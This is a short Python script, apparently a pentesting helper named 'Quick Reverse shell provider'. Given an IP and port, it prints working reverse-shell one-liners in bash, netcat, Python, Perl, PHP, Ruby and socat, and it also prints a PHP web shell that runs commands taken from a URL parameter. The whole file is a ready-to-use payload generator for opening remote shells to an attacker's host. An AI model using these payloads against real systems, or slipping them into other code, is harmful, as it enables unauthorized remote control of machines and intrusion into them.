#!/usr/bin/env python3

from pwn import *
import argparse

parser = argparse.ArgumentParser(description="Quick Reverse shell provider")
parser.add_argument('-b', '--bash',metavar=('ip', 'port'), help="bash reverse shell", nargs=2)
parser.add_argument('-n', '--nc',metavar=('ip', 'port'), help="netcat reverse shell", nargs=2)
parser.add_argument('-py', '--python',metavar=('ip', 'port'), help="python reverse shell", nargs=2)
parser.add_argument('-p', '--perl',metavar=('ip', 'port'), help="perl reverse shell", nargs=2)
parser.add_argument('-r', '--ruby',metavar=('ip', 'port'), help="ruby reverse shell", nargs=2)
parser.add_argument('-php', '--php',metavar=('ip', 'port'), help="php reverse shell", nargs=2)
parser.add_argument('-s', '--socat',metavar=('ip', 'port'), help="socat reverse shell", nargs=2)
argparse = parser.parse_args()

def logo():
	print("""
##      ## ########   #######  ##    ##  ######  ##     ## ########   ######  ##     ##  #######  ##       ##       
##  ##  ## ##     ## ##     ## ###   ## ##    ## ##     ## ##     ## ##    ## ##     ## ##     ## ##       ##       
##  ##  ## ##     ##        ## ####  ## ##       ##     ## ##     ## ##       ##     ##        ## ##       ##       
##  ##  ## ########   #######  ## ## ## ##       ######### ########   ######  #########  #######  ##       ##       
##  ##  ## ##   ##          ## ##  #### ##       ##     ## ##   ##         ## ##     ##        ## ##       ##       
##  ##  ## ##    ##  ##     ## ##   ### ##    ## ##     ## ##    ##  ##    ## ##     ## ##     ## ##       ##       
 ###  ###  ##     ##  #######  ##    ##  ######  ##     ## ##     ##  ######  ##     ##  #######  ######## ######## 

 """)

if argparse.bash:
	log.info(f'bash -i >& /dev/tcp/{argparse.bash[0]}/{argparse.bash[1]} 0>&1')
elif argparse.nc:
	log.info(f"nc -e /bin/sh {argparse.nc[0]} {argparse.nc[1]}")
	log.info(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {argparse.nc[0]} {argparse.nc[1]} >/tmp/f")
elif argparse.python:
	log.info(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{argparse.python[0]}',{argparse.python[1]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'")
elif argparse.perl:
	log.info(f"perl -e 'use Socket;$i='{argparse.perl[0]}';$p={argparse.perl[1]};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};'\n")
elif argparse.php:
	log.info(f"php -r '$sock=fsockopen('{argparse.php[0]}',{argparse.php[1]});exec('/bin/sh -i <&3 >&3 2>&3');'")
	log.info("<?php system($_GET['cmd']);?>")
	log.info(f"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{argparse.php[0]}/{argparse.php[1]} 0>&1\"');")
elif argparse.ruby:
	log.info(f"ruby -rsocket -e'f=TCPSocket.open('{argparse.ruby[0]}',{argparse.ruby[1]}).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'")
elif argparse.socat:
	log.info("On the Attacker Machine: \n")
	log.success(f"socat file:`tty`,raw,echo=0 tcp-listen:{argparse.socat[1]}")
	log.info("On the Client Machine: \n")
	log.success(f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{argparse.socat[0]}:{argparse.socat[1]}")
else:
	logo()
	parser.print_help()
	


